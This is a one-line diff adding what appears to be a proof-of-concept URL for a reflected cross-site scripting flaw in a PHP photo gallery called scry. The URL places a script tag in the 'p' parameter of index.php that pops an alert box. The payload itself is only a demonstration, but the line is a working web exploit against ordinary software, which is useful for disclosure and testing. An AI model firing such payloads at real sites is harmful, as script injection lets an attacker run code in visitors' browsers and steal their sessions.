@@ -1,0 +1,1 @@
+http://www.example.com/[Path to scry gallery]/index.php?v=list&i=0&p=<script>var%20variable=111111111111111111;alert(variable);</script>
